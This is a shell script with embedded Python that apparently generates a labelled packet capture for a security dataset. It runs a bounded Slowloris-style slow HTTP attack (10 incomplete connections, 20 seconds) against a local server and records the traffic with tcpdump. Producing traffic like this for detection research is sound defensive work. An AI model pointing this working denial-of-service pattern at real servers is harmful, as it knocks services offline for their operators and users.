#!/bin/bash
set -e

OUTPUT="datasets/raw/attacks/slowloris/slowloris.pcap"
TARGET="127.0.0.1"
PORT="8080"

echo "[+] Starting controlled Slowloris-pattern capture"
echo "[+] Target: ${TARGET}:${PORT}"
echo "[+] Connections: 10"
echo "[+] Duration: 20 seconds"

sudo tcpdump -i lo -w "$OUTPUT" "tcp port $PORT" &
TCPDUMP_PID=$!

sleep 2

echo "[+] Opening incomplete HTTP connections..."

python3 - <<'PY'
import socket
import time

TARGET = "127.0.0.1"
PORT = 8080

CONNECTIONS = 10
INTERVAL = 2
DURATION = 20

sockets = []

try:
    # Open a bounded number of TCP connections.
    for i in range(CONNECTIONS):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)

        s.connect((TARGET, PORT))

        # Send an intentionally incomplete HTTP request.
        # We do NOT send the final CRLF that completes the headers.
        request = (
            f"GET /slow{i} HTTP/1.1\r\n"
            f"Host: {TARGET}:{PORT}\r\n"
            "User-Agent: CyberDhristi-Lab\r\n"
        )

        s.sendall(request.encode())

        sockets.append(s)

    print(f"[+] {len(sockets)} incomplete HTTP connections opened.")

    start = time.time()
    counter = 0

    while time.time() - start < DURATION:

        for i, s in enumerate(sockets):
            try:
                # Small header fragment.
                fragment = f"X-Slow-{counter}: {i}\r\n"
                s.sendall(fragment.encode())
            except OSError:
                pass

        counter += 1
        time.sleep(INTERVAL)

finally:

    for s in sockets:
        try:
            s.close()
        except OSError:
            pass

print("[+] Slow HTTP test finished.")
PY

echo "[+] Stopping tcpdump..."

sudo kill -2 "$TCPDUMP_PID" 2>/dev/null || true
wait "$TCPDUMP_PID" 2>/dev/null || true

echo
echo "[+] Slowloris capture complete:"
ls -lh "$OUTPUT"
